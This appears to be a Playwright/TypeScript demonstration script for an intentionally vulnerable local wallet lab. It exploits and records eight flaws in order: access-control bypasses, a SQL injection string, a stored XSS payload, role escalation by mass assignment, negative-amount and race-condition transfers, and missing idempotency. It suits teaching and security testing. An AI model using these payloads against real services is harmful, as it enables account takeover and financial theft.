import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { randomUUID } from "node:crypto";
import { chromium } from "@playwright/test";
import { labPool, setupLab, ids } from "../apps/api/src/lab/db.js";

const origin = "http://127.0.0.1:4001";
type Evidence = {
  scenario: string;
  observed: Record<string, unknown>;
  expectedInsecureOutcome: boolean;
};
const evidence: Evidence[] = [];
function record(scenario: string, observed: Record<string, unknown>) {
  evidence.push({ scenario, observed, expectedInsecureOutcome: true });
  console.log(`Observed: ${scenario}`);
}
async function actor(name: string) {
  const cookies = new Map<string, string>();
  let csrf = "";
  async function call(
    path: string,
    method = "GET",
    body?: unknown,
    headers: Record<string, string> = {},
  ) {
    const response = await fetch(`${origin}${path}`, {
      method,
      headers: {
        Origin: origin,
        "Content-Type": "application/json",
        Cookie: [...cookies].map(([k, v]) => `${k}=${v}`).join("; "),
        "X-CSRF-Token": csrf,
        ...headers,
      },
      body: body === undefined ? undefined : JSON.stringify(body),
      redirect: "error",
    });
    for (const c of response.headers.getSetCookie()) {
      const [pair] = c.split(";");
      const index = pair.indexOf("=");
      cookies.set(pair.slice(0, index), pair.slice(index + 1));
    }
    const data = await response.json();
    return { status: response.status, data };
  }
  csrf = (await call("/api/v1/auth/csrf")).data.csrfToken;
  assert.equal(
    (
      await call("/api/v1/auth/login", "POST", {
        email: `${name}@example.test`,
        password: process.env.DEMO_PASSWORD,
      })
    ).status,
    200,
  );
  return { call, cookies };
}
try {
  const health = await fetch(`${origin}/api/v1/health`);
  assert.equal(
    (await health.json()).lab,
    true,
    "Refusing a target that is not the explicit lab.",
  );
  // This reset targets only guarded securewallet_lab tables, never the secure database.
  await setupLab(true);
  const alice = await actor("alice");
  const bob = await actor("bob");
  const bola = await bob.call(`/api/v1/tickets/${ids.ticket}`);
  assert.equal(bola.data.ticket.user_id, ids.alice);
  record("Broken object-level authorization", {
    status: bola.status,
    owner: bola.data.ticket.user_id,
    caller: ids.bob,
  });
  const bfla = await bob.call("/api/v1/admin/users");
  assert.equal(bfla.data.items.length, 3);
  record("Broken function-level authorization", {
    status: bfla.status,
    recordsRead: bfla.data.items.length,
    callerRole: "user",
  });
  const normal = await alice.call("/api/v1/transactions");
  const injected = await alice.call(
    `/api/v1/transactions?search=${encodeURIComponent("' OR true --")}`,
  );
  assert.equal(normal.data.items.length, 0);
  assert.equal(injected.data.items.length, 1);
  record("SQL injection", {
    normalRecords: 0,
    injectedRecords: 1,
    exposedSender: injected.data.items[0].sender_id,
  });
  const payload = "<script>document.body.dataset.labXss='executed'</script>";
  assert.equal(
    (await bob.call("/api/v1/comments", "POST", { body: payload })).status,
    201,
  );
  const browser = await chromium.launch();
  try {
    const context = await browser.newContext();
    await context.addCookies(
      [...bob.cookies].map(([name, value]) => ({
        name,
        value,
        url: origin,
        httpOnly: true,
        sameSite: "Strict" as const,
      })),
    );
    const page = await context.newPage();
    await page.goto(`${origin}/comments`);
    const executed = await page.locator("body").getAttribute("data-lab-xss");
    assert.equal(executed, "executed");
    record("Stored XSS", { browserMarker: executed });
  } finally {
    await browser.close();
  }
  const mass = await bob.call("/api/v1/profile", "PATCH", { role: "admin" });
  assert.equal(mass.data.user.role, "admin");
  record("Mass assignment", {
    roleBefore: "user",
    roleAfter: mass.data.user.role,
  });
  const invalid = await alice.call("/api/v1/transfers/invalid-amount", "POST", {
    recipientId: ids.bob,
    amount: -100,
  });
  assert.equal(invalid.status, 201);
  const invalidBalance = (await alice.call("/api/v1/wallet")).data.wallet
    .balance;
  assert.equal(invalidBalance, "100100");
  record("Invalid transfer amount", {
    acceptedAmount: -100,
    senderBefore: 100000,
    senderAfter: Number(invalidBalance),
  });
  await labPool.query("UPDATE lab_users SET balance=100000");
  const group = randomUUID();
  const race = await Promise.all(
    [1, 2].map(() =>
      alice.call(
        "/api/v1/transfers/race",
        "POST",
        { recipientId: ids.bob, amount: 70000 },
        { "X-Lab-Barrier": group },
      ),
    ),
  );
  assert.deepEqual(
    race.map((r) => r.status),
    [201, 201],
  );
  const raceBalance = (await alice.call("/api/v1/wallet")).data.wallet.balance;
  assert.equal(raceBalance, "-40000");
  record("Race condition", {
    startingBalance: 100000,
    amountEach: 70000,
    statuses: race.map((r) => r.status),
    endingBalance: Number(raceBalance),
  });
  await labPool.query("UPDATE lab_users SET balance=100000");
  const key = randomUUID();
  const first = await alice.call(
    "/api/v1/transfers/retry",
    "POST",
    { recipientId: ids.bob, amount: 500 },
    { "Idempotency-Key": key },
  );
  const second = await alice.call(
    "/api/v1/transfers/retry",
    "POST",
    { recipientId: ids.bob, amount: 500 },
    { "Idempotency-Key": key },
  );
  assert.equal(first.status, 201);
  assert.equal(second.status, 201);
  assert.notEqual(first.data.transfer.id, second.data.transfer.id);
  const retryBalance = (await alice.call("/api/v1/wallet")).data.wallet.balance;
  assert.equal(retryBalance, "99000");
  record("Missing idempotency", {
    processedTransfers: 2,
    senderBefore: 100000,
    senderAfter: Number(retryBalance),
  });
} catch (error) {
  console.error(
    "Lab demonstration failed:",
    error instanceof Error ? error.message : "unknown",
  );
  process.exitCode = 1;
} finally {
  await labPool.end();
  await mkdir("docs/evidence", { recursive: true });
  const report = {
    generatedAt: new Date().toISOString(),
    target: origin,
    intentionallyIntroduced: true,
    complete: evidence.length === 8,
    evidence,
  };
  await writeFile(
    "docs/evidence/lab-demonstrations.json",
    JSON.stringify(report, null, 2),
  );
  const escape = (s: string) =>
    s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
  await writeFile(
    "docs/evidence/lab-demonstrations.html",
    `<!doctype html><html lang="en"><meta charset="utf-8"><title>SecureWallet lab evidence</title><style>body{font:16px system-ui;max-width:900px;margin:40px auto;padding:20px;color:#183f30}pre{background:#eef2eb;padding:18px;overflow:auto}article{border-top:1px solid #bbc7b8;padding:16px 0}</style><h1>Intentionally vulnerable lab evidence</h1><p>Generated ${report.generatedAt}. ${evidence.length}/8 expected insecure outcomes observed. Fake local fixtures; not findings in a real company.</p>${evidence.map((e) => `<article><h2>${escape(e.scenario)}</h2><pre>${escape(JSON.stringify(e.observed, null, 2))}</pre></article>`).join("")}</html>`,
  );
}
